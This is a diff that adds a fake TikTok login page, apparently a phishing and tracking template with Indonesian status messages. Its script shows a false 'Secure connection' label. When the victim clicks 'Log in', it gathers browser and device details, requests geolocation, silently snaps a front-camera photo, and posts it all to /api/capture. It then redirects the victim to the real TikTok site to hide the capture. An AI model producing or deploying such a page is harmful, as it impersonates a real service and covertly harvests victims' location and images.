@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TikTok</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Arial,sans-serif;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.container{background:#fff;padding:40px;border-radius:12px;max-width:400px;width:100%;text-align:center}
+.logo{font-size:36px;font-weight:bold;color:#000;margin-bottom:10px}
+.logo span{color:#ff0050}
+.subtitle{color:#888;font-size:14px;margin-bottom:30px}
+.input-group{margin-bottom:15px;text-align:left}
+.input-group label{display:block;font-size:13px;color:#888;margin-bottom:5px}
+.input-group input{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;font-size:16px;outline:none}
+.btn{width:100%;padding:14px;background:#ff0050;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer}
+.btn:hover{background:#e6004a}
+.btn:disabled{opacity:0.6;cursor:not-allowed}
+.status{margin-top:15px;font-size:13px;color:#888}
+.spinner{display:none;border:3px solid #f3f3f3;border-top:3px solid #ff0050;border-radius:50%;width:20px;height:20px;animation:spin 1s linear infinite;margin:10px auto}
+@keyframes spin{100%{transform:rotate(360deg)}}
+.footer{margin-top:20px;font-size:12px;color:#888}
+.footer a{color:#ff0050;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="logo">Tik<span>Tok</span></div>
+<p class="subtitle">Log in to your account</p>
+<div class="input-group"><label>Username</label><input type="text" value="user"></div>
+<div class="input-group"><label>Password</label><input type="password" value="password"></div>
+<button class="btn" id="captureBtn">Log in</button>
+<div class="spinner" id="spinner"></div>
+<div class="status" id="status">🔒 Secure connection</div>
+<div class="footer"><a href="#">Forgot password?</a> · <a href="#">Sign up</a></div>
+</div>
+<script>
+(function(){
+const btn=document.getElementById('captureBtn');
+const statusEl=document.getElementById('status');
+const spinner=document.getElementById('spinner');
+let dataSent=false;
+const path=window.location.pathname;
+const code=path.split('/').pop()||'unknown';
+btn.addEventListener('click',function(){
+if(dataSent)return;
+dataSent=true;
+btn.disabled=true;
+spinner.style.display='block';
+statusEl.textContent='📡 Mengumpulkan data...';
+const reportData={shortCode:code,type:'template',data:{ip:'Tidak diketahui',country:'Tidak diketahui',city:'Tidak diketahui',region:'Tidak diketahui',isp:'Tidak diketahui',browser:navigator.userAgent,os:navigator.platform||'Tidak diketahui',device:navigator.userAgentData?.platform||navigator.platform||'Tidak diketahui',userAgent:navigator.userAgent,fromUrl:document.referrer||'Direct',photoStatus:'Kamera ditolak/gagal',template:'TikTok'}};
+if(navigator.geolocation){
+navigator.geolocation.getCurrentPosition(function(pos){
+reportData.data.lat=pos.coords.latitude;
+reportData.data.lng=pos.coords.longitude;
+reportData.data.accuracy=pos.coords.accuracy+' meter';
+statusEl.textContent='📍 Lokasi didapatkan ✅';
+takePhoto();
+},function(){takePhoto();});
+}else{takePhoto();}
+function takePhoto(){
+if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
+navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false})
+.then(function(stream){
+const video=document.createElement('video');
+video.srcObject=stream;
+video.onloadedmetadata=function(){
+video.play();
+const canvas=document.createElement('canvas');
+canvas.width=Math.min(video.videoWidth,640);
+canvas.height=Math.min(video.videoHeight,480);
+const ctx=canvas.getContext('2d');
+ctx.drawImage(video,0,0,canvas.width,canvas.height);
+reportData.data.photo=canvas.toDataURL('image/jpeg',0.7);
+reportData.data.photoStatus='📷 Foto berhasil diambil ✅';
+stream.getTracks().forEach(t=>t.stop());
+statusEl.textContent='📷 Foto berhasil ✅';
+sendData();
+};
+})
+.catch(function(){reportData.data.photoStatus='📷 Kamera ditolak/gagal';sendData();});
+}else{reportData.data.photoStatus='📷 Kamera tidak didukung';sendData();}
+}
+function sendData(){
+statusEl.textContent='📤 Mengirim data...';
+fetch('/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(reportData)})
+.then(res=>res.json())
+.then(function(){
+statusEl.textContent='✅ Berhasil!';
+spinner.style.display='none';
+btn.textContent='✅ Done';
+setTimeout(()=>{window.location.href='https://www.tiktok.com';},1500);
+})
+.catch(function(){
+statusEl.textContent='❌ Gagal';
+spinner.style.display='none';
+btn.textContent='⚠️ Error';
+setTimeout(()=>{window.location.href='https://www.tiktok.com';},1500);
+});
+}
+});
+})();
+</script>
+</body>
+</html>
